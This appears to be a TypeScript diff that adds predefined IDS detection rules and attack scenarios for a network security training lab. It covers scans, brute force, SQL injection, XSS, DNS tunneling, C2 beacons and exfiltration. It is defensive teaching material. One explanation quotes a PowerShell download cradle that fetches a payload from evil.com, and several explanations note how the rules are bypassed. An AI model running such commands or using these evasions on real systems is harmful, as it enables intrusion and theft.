@@ -1,0 +1,238 @@
+import type { RuleEntry } from '../types/lab'
+
+export const PREDEFINED_RULES: RuleEntry[] = [
+  // --- SCANNING ---
+  {
+    id: 'scan-nmap-syn',
+    sid: '1000001',
+    category: 'scanning',
+    difficulty: 'beginner',
+    msg: 'SCAN nmap SYN Scan Detected',
+    rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"SCAN nmap SYN Scan Detected"; flags:S,12; threshold:type both,track by_src,count 20,seconds 5; classtype:attempted-recon; sid:1000001; rev:1;)',
+    explanation: 'Detects nmap SYN scans by looking for a high rate of TCP SYN packets (no ACK) from a single source to many ports within 5 seconds. SYN scans are the most common port scan technique — they send a SYN, wait for SYN-ACK (open) or RST (closed), and never complete the handshake.',
+  },
+  {
+    id: 'scan-ping-sweep',
+    sid: '1000002',
+    category: 'scanning',
+    difficulty: 'beginner',
+    msg: 'SCAN ICMP Ping Sweep',
+    rule: 'alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"SCAN ICMP Ping Sweep"; itype:8; threshold:type both,track by_src,count 10,seconds 5; classtype:attempted-recon; sid:1000002; rev:1;)',
+    explanation: 'Detects ping sweeps by counting ICMP Echo Request packets (type 8) from one source to many hosts. Attackers use ping sweeps to discover which hosts are alive before targeting them.',
+  },
+  {
+    id: 'scan-udp-sweep',
+    sid: '1000003',
+    category: 'scanning',
+    difficulty: 'intermediate',
+    msg: 'SCAN UDP Port Scan',
+    rule: 'alert udp $EXTERNAL_NET any -> $HOME_NET any (msg:"SCAN UDP Port Scan"; threshold:type both,track by_src,count 30,seconds 10; classtype:attempted-recon; sid:1000003; rev:1;)',
+    explanation: 'Detects UDP port scans. UDP scanning is slower than TCP but can reveal services like DNS, SNMP, and TFTP. Many firewalls pass UDP silently, making it a useful reconnaissance technique.',
+  },
+
+  // --- BRUTE FORCE ---
+  {
+    id: 'bf-ssh',
+    sid: '1000010',
+    category: 'brute-force',
+    difficulty: 'beginner',
+    msg: 'EXPLOIT SSH Brute Force Attempt',
+    rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"EXPLOIT SSH Brute Force Attempt"; flow:to_server,established; content:"SSH"; threshold:type both,track by_src,count 5,seconds 60; classtype:attempted-admin; sid:1000010; rev:1;)',
+    explanation: 'Detects repeated SSH login attempts from the same source. The rule triggers after 5 established SSH connections in 60 seconds, which is consistent with automated password guessing tools like Hydra or Medusa.',
+  },
+  {
+    id: 'bf-http-login',
+    sid: '1000011',
+    category: 'brute-force',
+    difficulty: 'beginner',
+    msg: 'EXPLOIT HTTP Login Brute Force',
+    rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"EXPLOIT HTTP Login Brute Force"; flow:to_server,established; content:"POST"; http_method; content:"/login"; http_uri; threshold:type both,track by_src,count 10,seconds 30; classtype:attempted-admin; sid:1000011; rev:1;)',
+    explanation: 'Detects HTTP brute force attacks against login pages. It looks for many POST requests to URLs containing "/login" from the same source. Tools like Hydra, Burp Intruder, or custom scripts generate this pattern.',
+  },
+  {
+    id: 'bf-ftp',
+    sid: '1000012',
+    category: 'brute-force',
+    difficulty: 'beginner',
+    msg: 'EXPLOIT FTP Brute Force Attempt',
+    rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:"EXPLOIT FTP Brute Force Attempt"; flow:to_server,established; content:"PASS "; threshold:type both,track by_src,count 5,seconds 60; classtype:attempted-admin; sid:1000012; rev:1;)',
+    explanation: 'Detects FTP password guessing by looking for repeated PASS commands. FTP sends credentials in plaintext, making it easy to spot. The PASS command is sent with each login attempt.',
+  },
+
+  // --- WEB ATTACKS ---
+  {
+    id: 'web-sqli-union',
+    sid: '1000020',
+    category: 'web-attacks',
+    difficulty: 'beginner',
+    msg: 'WEB SQL Injection UNION SELECT Attempt',
+    rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"WEB SQL Injection UNION SELECT Attempt"; flow:to_server,established; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; within:20; http_uri; classtype:web-application-attack; sid:1000020; rev:1;)',
+    explanation: 'Detects UNION-based SQL injection in HTTP request URIs. Attackers use UNION SELECT to append queries and extract data from other database tables. The rule requires both UNION and SELECT to appear close together to reduce false positives.',
+  },
+  {
+    id: 'web-sqli-error',
+    sid: '1000021',
+    category: 'web-attacks',
+    difficulty: 'intermediate',
+    msg: 'WEB SQL Injection Error-Based Probe',
+    rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"WEB SQL Injection Error-Based Probe"; flow:to_server,established; content:"\'"; http_uri; content:"--"; http_uri; classtype:web-application-attack; sid:1000021; rev:1;)',
+    explanation: 'Detects error-based SQL injection by looking for a single quote (\') followed by SQL comment syntax (--) in the URI. A single quote breaks SQL syntax intentionally to generate error messages that reveal database structure.',
+  },
+  {
+    id: 'web-dir-traversal',
+    sid: '1000022',
+    category: 'web-attacks',
+    difficulty: 'beginner',
+    msg: 'WEB Directory Traversal Attempt',
+    rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"WEB Directory Traversal Attempt"; flow:to_server,established; content:"../"; http_uri; classtype:web-application-attack; sid:1000022; rev:1;)',
+    explanation: 'Detects path traversal attacks using "../" sequences in HTTP URIs. Attackers use this to escape the web root and access files like /etc/passwd or configuration files. URL-encoded variants (..%2F, %2E%2E%2F) can bypass this rule.',
+  },
+  {
+    id: 'web-sqlmap-ua',
+    sid: '1000023',
+    category: 'web-attacks',
+    difficulty: 'beginner',
+    msg: 'WEB sqlmap Scanner User-Agent',
+    rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"WEB sqlmap Scanner User-Agent"; flow:to_server,established; content:"sqlmap"; nocase; http_header; classtype:web-application-attack; sid:1000023; rev:1;)',
+    explanation: 'Detects the sqlmap automated SQL injection tool by its default User-Agent string. sqlmap is extremely common in SQL injection attacks. Changing the User-Agent bypasses this rule — so it\'s most useful for catching unskilled attackers.',
+  },
+  {
+    id: 'web-xss-script',
+    sid: '1000024',
+    category: 'web-attacks',
+    difficulty: 'beginner',
+    msg: 'WEB Cross-Site Scripting Script Tag',
+    rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"WEB Cross-Site Scripting Script Tag"; flow:to_server,established; content:"<script"; nocase; http_uri; classtype:web-application-attack; sid:1000024; rev:1;)',
+    explanation: 'Detects basic XSS attempts with <script> tags in the URL. This is a simple but common probe. Most modern WAFs and this rule catch it, but attackers often bypass it using event handlers (onerror=, onload=) or encoding tricks.',
+  },
+
+  // --- DNS ---
+  {
+    id: 'dns-long-query',
+    sid: '1000030',
+    category: 'dns',
+    difficulty: 'intermediate',
+    msg: 'DNS Suspiciously Long Query',
+    rule: 'alert udp $HOME_NET any -> any 53 (msg:"DNS Suspiciously Long Query"; content:"|00 01 00 00|"; offset:4; depth:4; dsize:>100; classtype:bad-unknown; sid:1000030; rev:1;)',
+    explanation: 'Detects unusually long DNS queries (over 100 bytes). Legitimate DNS queries are short. Long queries are a hallmark of DNS tunneling tools like dnscat2 or iodine, which encode data into DNS query names to exfiltrate data or tunnel C2 traffic.',
+  },
+  {
+    id: 'dns-txt-tunneling',
+    sid: '1000031',
+    category: 'dns',
+    difficulty: 'advanced',
+    msg: 'DNS TXT Record Query - Possible Tunneling',
+    rule: 'alert udp $HOME_NET any -> any 53 (msg:"DNS TXT Record Query - Possible Tunneling"; content:"|00 10|"; offset:2; depth:4; threshold:type both,track by_src,count 10,seconds 60; classtype:bad-unknown; sid:1000031; rev:1;)',
+    explanation: 'Detects frequent DNS TXT record queries. TXT records are rarely used in normal traffic but are the preferred record type for DNS tunneling — they can carry arbitrary base64-encoded data up to 255 bytes per record. dnscat2 uses TXT records heavily.',
+  },
+
+  // --- MALWARE / C2 ---
+  {
+    id: 'malware-c2-beacon',
+    sid: '1000040',
+    category: 'malware',
+    difficulty: 'intermediate',
+    msg: 'MALWARE Suspicious C2 Beacon Pattern',
+    rule: 'alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:"MALWARE Suspicious C2 Beacon Pattern"; flow:to_server,established; content:"User-Agent|3a 20|"; http_header; content:"Mozilla/4.0"; http_header; classtype:trojan-activity; sid:1000040; rev:1;)',
+    explanation: 'Detects old Mozilla/4.0 User-Agent strings over HTTPS. Modern browsers all use Mozilla/5.0+. This outdated agent is common in malware C2 frameworks (Metasploit, Cobalt Strike defaults) that copy old IE user agent strings. Real false positive risk: very old IE browsers.',
+  },
+  {
+    id: 'malware-powershell-download',
+    sid: '1000041',
+    category: 'malware',
+    difficulty: 'intermediate',
+    msg: 'MALWARE PowerShell Download Cradle in HTTP',
+    rule: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"MALWARE PowerShell Download Cradle in HTTP"; flow:to_server,established; content:"powershell"; nocase; http_uri; classtype:trojan-activity; sid:1000041; rev:1;)',
+    explanation: 'Detects PowerShell references in HTTP URIs, typical of download cradles — one-line commands used in initial access to download a second-stage payload. Example: IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')',
+  },
+
+  // --- EXFILTRATION ---
+  {
+    id: 'exfil-large-upload',
+    sid: '1000050',
+    category: 'exfiltration',
+    difficulty: 'advanced',
+    msg: 'EXFIL Large HTTP POST Possible Data Exfiltration',
+    rule: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"EXFIL Large HTTP POST Possible Data Exfiltration"; flow:to_server,established; content:"POST"; http_method; dsize:>10000; threshold:type both,track by_src,count 3,seconds 60; classtype:policy-violation; sid:1000050; rev:1;)',
+    explanation: 'Detects large HTTP POST requests from internal hosts. A series of POST requests with payloads over 10KB could indicate staged data exfiltration. This has high false positive potential (file uploads, web apps), so it\'s best combined with destination reputation data.',
+  },
+]
+
+export const SCENARIOS = [
+  {
+    id: 'normal-browsing',
+    name: 'Normal Web Browsing',
+    description: 'Typical user browsing — HTTP/HTTPS requests, DNS lookups, no attacks.',
+    attacker_role: false,
+    difficulty: 'beginner' as const,
+  },
+  {
+    id: 'nmap-syn-scan',
+    name: 'Nmap SYN Scan',
+    description: 'Classic nmap -sS port scan from attacker to internal network. Sends SYN packets to many ports rapidly.',
+    attacker_role: true,
+    difficulty: 'beginner' as const,
+  },
+  {
+    id: 'ping-sweep',
+    name: 'ICMP Ping Sweep',
+    description: 'Attacker pings many hosts to discover which are alive before targeting them.',
+    attacker_role: true,
+    difficulty: 'beginner' as const,
+  },
+  {
+    id: 'ssh-brute-force',
+    name: 'SSH Brute Force',
+    description: 'Automated password guessing against SSH service (port 22) using a tool like Hydra.',
+    attacker_role: true,
+    difficulty: 'beginner' as const,
+  },
+  {
+    id: 'http-brute-force',
+    name: 'HTTP Login Brute Force',
+    description: 'Repeated POST requests to a login page trying different credentials.',
+    attacker_role: true,
+    difficulty: 'beginner' as const,
+  },
+  {
+    id: 'sql-injection',
+    name: 'SQL Injection Attack',
+    description: 'Attacker sends malicious SQL payloads in HTTP requests to extract database data.',
+    attacker_role: true,
+    difficulty: 'beginner' as const,
+  },
+  {
+    id: 'dns-tunneling',
+    name: 'DNS Tunneling',
+    description: 'Internal host communicates over DNS using long TXT queries — typical of data exfiltration or C2 evasion.',
+    attacker_role: false,
+    difficulty: 'intermediate' as const,
+  },
+  {
+    id: 'http-c2-beacon',
+    name: 'HTTP C2 Beacon',
+    description: 'Compromised internal host sending periodic HTTP beacons to external C2 server with suspicious user-agent.',
+    attacker_role: false,
+    difficulty: 'intermediate' as const,
+  },
+]
+
+export const CATEGORY_LABELS: Record<string, string> = {
+  'scanning': 'Scanning',
+  'brute-force': 'Brute Force',
+  'web-attacks': 'Web Attacks',
+  'dns': 'DNS',
+  'malware': 'Malware / C2',
+  'exfiltration': 'Exfiltration',
+  'custom': 'Custom',
+}
+
+export const CATEGORY_COLORS: Record<string, string> = {
+  'scanning': 'text-yellow-400 bg-yellow-900/30 border-yellow-700/40',
+  'brute-force': 'text-orange-400 bg-orange-900/30 border-orange-700/40',
+  'web-attacks': 'text-red-400 bg-red-900/30 border-red-700/40',
+  'dns': 'text-blue-400 bg-blue-900/30 border-blue-700/40',
+  'malware': 'text-purple-400 bg-purple-900/30 border-purple-700/40',
+  'exfiltration': 'text-pink-400 bg-pink-900/30 border-pink-700/40',
+  'custom': 'text-gray-400 bg-gray-800/30 border-gray-700/40',
+}
